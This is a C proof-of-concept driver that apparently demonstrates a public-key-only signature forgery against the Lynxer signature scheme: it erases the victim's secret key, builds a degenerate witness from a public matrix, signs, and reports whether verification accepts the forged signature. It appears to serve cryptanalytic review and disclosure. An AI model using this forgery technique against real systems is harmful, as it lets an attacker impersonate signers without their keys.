/*
 * Independent review driver for the Lynxer degenerate-witness claim.
 * Compiled alongside one unmodified submitted reference parameter set.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

#include "SIG_AlgorithmInstance.h"
#include "drng.h"
#include "instances.h"
#include "lynx_matrices.h"
#include "owf.h"
#include "voleith_impl.h"

DRNG_ctx drng_algorithm;

static sig_paramid_t parameter_id(void) {
  if (strcmp(ALGORITHM_INSTANCE, "Lynxer-256s") == 0) return LYNXER_256S;
  if (strcmp(ALGORITHM_INSTANCE, "Lynxer-256f") == 0) return LYNXER_256F;
  if (strcmp(ALGORITHM_INSTANCE, "Lynxer-384s") == 0) return LYNXER_384S;
  if (strcmp(ALGORITHM_INSTANCE, "Lynxer-384f") == 0) return LYNXER_384F;
  if (strcmp(ALGORITHM_INSTANCE, "Lynxer-512s") == 0) return LYNXER_512S;
  if (strcmp(ALGORITHM_INSTANCE, "Lynxer-512f") == 0) return LYNXER_512F;
  return PARAMETER_SET_INVALID;
}

static void eval_owf(unsigned int csp, const uint8_t *key,
                     const uint8_t *input, uint8_t *output) {
  switch (csp) {
    case 256: owf_256(key, input, output); break;
    case 384: owf_384(key, input, output); break;
    case 512: owf_512(key, input, output); break;
    default: abort();
  }
}

static double seconds(clock_t start, clock_t end) {
  return (double)(end - start) / (double)CLOCKS_PER_SEC;
}

int main(void) {
  static const uint8_t seed[64] = {
    0x4c,0x79,0x6e,0x78,0x65,0x72,0x20,0x69,
    0x6e,0x64,0x65,0x70,0x65,0x6e,0x64,0x65,
    0x6e,0x74,0x20,0x72,0x65,0x76,0x69,0x65,
    0x77,0x20,0x32,0x30,0x32,0x36,0x2d,0x30,
    0x39,0x2d,0x32,0x37,0x00,0x01,0x02,0x03,
    0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,
    0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,
    0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b
  };
  static const uint8_t attacker_seed[64] = {
    0xa5,0x5a,0xa5,0x5a,0xa5,0x5a,0xa5,0x5a,
    0x10,0x32,0x54,0x76,0x98,0xba,0xdc,0xfe,
    0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,
    0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff,
    0x4c,0x79,0x6e,0x78,0x65,0x72,0x2d,0x66,
    0x6f,0x72,0x67,0x65,0x72,0x2d,0x72,0x6e,
    0x67,0x2d,0x69,0x73,0x2d,0x70,0x75,0x62,
    0x6c,0x69,0x63,0x00,0x01,0x02,0x03,0x04
  };
  static const uint8_t message[] =
    "Independent public-key-only Lynxer forgery review, 2026-09-27";
  const sig_paramid_t id = parameter_id();
  const sig_paramset_t *params = sig_get_paramset(id);
  if (!params || !(params->csp == 256 || params->csp == 384 || params->csp == 512)) {
    fprintf(stderr, "unsupported parameter set: %s\n", ALGORITHM_INSTANCE);
    return 2;
  }

  unsigned long long pk_len = sig_get_pk_len_bytes();
  unsigned long long sk_len = sig_get_sk_len_bytes();
  unsigned long long sig_len = sig_get_sn_len_bytes();
  const size_t field_bytes = params->csp / 8;
  const size_t witness_bytes = 3 * field_bytes;

  uint8_t *pk = calloc((size_t)pk_len, 1);
  uint8_t *sk = calloc((size_t)sk_len, 1);
  uint8_t *sig = calloc((size_t)sig_len, 1);
  uint8_t *witness = calloc(witness_bytes, 1);
  uint8_t *rho = calloc(field_bytes, 1);
  uint8_t *false_eval = calloc(field_bytes, 1);
  if (!pk || !sk || !sig || !witness || !rho || !false_eval) return 3;

  if (init_random_number(&drng_algorithm, seed, sizeof(seed)) != 0) return 4;
  if (sig_keygen(pk, &pk_len, sk, &sk_len) != 0) return 5;

  const uint8_t *owf_input = pk;
  const uint8_t *victim_target = pk + params->owf_input_size;
  memset(sk, 0, (size_t)sk_len);

  /* Separate attack randomness from the DRNG state used by victim keygen. */
  memset(&drng_algorithm, 0, sizeof(drng_algorithm));
  if (init_random_number(&drng_algorithm, attacker_seed, sizeof(attacker_seed)) != 0) return 6;

  lynx_t mats;
  if (lynx_init(&mats, params->csp, owf_input, params->owf_input_size) != 0) return 7;

  const uint8_t *forged_key = mats.C2;
  lynx_extend_witness(witness, forged_key, owf_input, params);
  memset(witness + field_bytes, 0, field_bytes);

  eval_owf(params->csp, forged_key, owf_input, false_eval);
  const int false_witness = memcmp(false_eval, victim_target, field_bytes) != 0;
  const int key_encoded = memcmp(witness, forged_key, field_bytes) == 0;
  int v1_zero = 1;
  for (size_t i = 0; i < field_bytes; ++i) v1_zero &= witness[field_bytes + i] == 0;

  if (get_random_number(&drng_algorithm, rho, params->csp) != 0) return 8;
  clock_t start = clock();
  voleith_sign(sig, message, sizeof(message) - 1, forged_key, owf_input,
               victim_target, witness, rho, field_bytes, params);
  clock_t after_sign = clock();

  const int verify = sig_verify(pk, pk_len, sig, sig_len,
                                (uint8_t *)message, sizeof(message) - 1);
  clock_t after_verify = clock();

  uint8_t changed_message[sizeof(message)];
  memcpy(changed_message, message, sizeof(message));
  changed_message[0] ^= 1;
  const int changed_verify = sig_verify(pk, pk_len, sig, sig_len,
                                        changed_message, sizeof(message) - 1);

  printf("parameter=%s\n", ALGORITHM_INSTANCE);
  printf("pk_bytes=%llu signature_bytes=%llu\n", pk_len, sig_len);
  printf("secret_buffer_erased=yes key_is_C2=%s v1_zero=%s\n",
         key_encoded ? "yes" : "no", v1_zero ? "yes" : "no");
  printf("forged_key_is_victim_preimage=%s\n", false_witness ? "no" : "yes");
  printf("sign_cpu_seconds=%.6f verify_cpu_seconds=%.6f\n",
         seconds(start, after_sign), seconds(after_sign, after_verify));
  printf("verify_return=%d changed_message_return=%d\n", verify, changed_verify);
  printf("RESULT=%s\n",
         false_witness && key_encoded && v1_zero && verify == 0 && changed_verify != 0
           ? "FORGERY_ACCEPTED" : "FAIL");
  free(false_eval);
  free(rho);
  free(witness);
  free(sig);
  free(sk);
  free(pk);
  return false_witness && key_encoded && v1_zero && verify == 0 && changed_verify != 0 ? 0 : 1;
}
